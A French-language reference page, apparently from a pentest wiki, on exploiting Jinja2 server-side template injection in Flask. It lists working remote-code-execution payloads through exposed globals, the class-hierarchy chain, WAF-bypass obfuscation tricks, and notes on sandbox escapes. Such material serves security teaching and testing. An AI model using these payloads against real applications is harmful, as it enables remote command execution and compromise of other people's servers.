---
title: "Injection de template côté serveur Jinja2"
description: "Exploiter la SSTI Jinja2 dans Flask : confirmation avec {{7*7}}, parcours des globals exposés vers os pour la RCE, et évasion de l'environnement sandboxé."
keywords:
  - SSTI Jinja2
  - Flask
  - cycler globals
  - évasion de sandbox
  - __class__ __mro__
---

# Jinja2

Jinja2 est le moteur derrière Flask, où `render_template_string(user_input)` (ou un template construit par concaténation) est le sink habituel. Confirmez avec `{{7*7}}` renvoyant `49`, et `{{config}}` pour dumper l'objet de configuration de Flask.

L'environnement par défaut de Flask n'est **pas** sandboxé, donc l'exploitation chemine depuis un objet globalement disponible jusqu'au module `os` et exécute une commande. Jinja2 expose les globals `cycler`, `joiner`, `lipsum`, `range` et `config`, chacun portant un `__globals__` atteignant l'interpréteur :

```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

La forme classique plus longue parcourt la hiérarchie de classes pour trouver une sous-classe qui lance des processus, utilisée lorsque les globals courts sont indisponibles :

```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

puis indexez la liste résultante jusqu'à `subprocess.Popen` et appelez-le. Les formes de globals ci-dessus sont plus courtes et plus fiables sur un Flask actuel.

Deux obstacles distincts sont souvent confondus. Le premier est un filtre d'entrée applicatif ou un WAF qui bloque les chaînes littérales (`__class__`, `os`, les backticks). On les déjoue avec de l'obfuscation qui ne change pas ce que le sandbox voit : le filtre `|attr()` avec un nom encodé (`|attr('\x5f\x5fclass\x5f\x5f')`), le smuggling de la chaîne depuis un paramètre de requête (`request.args.c`), ou sa concaténation à partir de morceaux. Cette obfuscation n'aide que contre le filtrage : dans un environnement Flask par défaut (non sandboxé), elle fait passer le parcours de globals ci-dessus.

Le second obstacle est un véritable `SandboxedEnvironment`, et l'obfuscation ci-dessus ne le bat pas. Le sandbox décode le nom d'attribut et le passe par `is_safe_attribute`, de sorte que `|attr('\x5f\x5fclass\x5f\x5f')` se résout en `__class__` et est rejeté exactement comme la forme en clair, renvoyant undefined ou levant `SecurityError` ; `__getitem__` est vérifié de la même façon. Une véritable évasion de sandbox ne vient donc pas de tours d'encodage mais d'une faille dans le sandbox d'une version Jinja2 précise : historiquement, les méthodes accessibles `str.format`/`format_map` fuitaient un accès par chaîne de format au graphe d'objets, et des lacunes similaires au niveau des méthodes ont été corrigées au fil du temps. Testez `{{ ''.__class__ }}` d'abord : s'il est rejeté, le sandbox est actif, et la tâche consiste à trouver une méthode spécifique à la version que le sandbox autorise encore, pas à ré-encoder les underscores.

## Outils

- tplmap, SSTImap

## Références

- Documentation Jinja2 : sandbox, template globals
- PortSwigger Web Security Academy: Server-side template injection
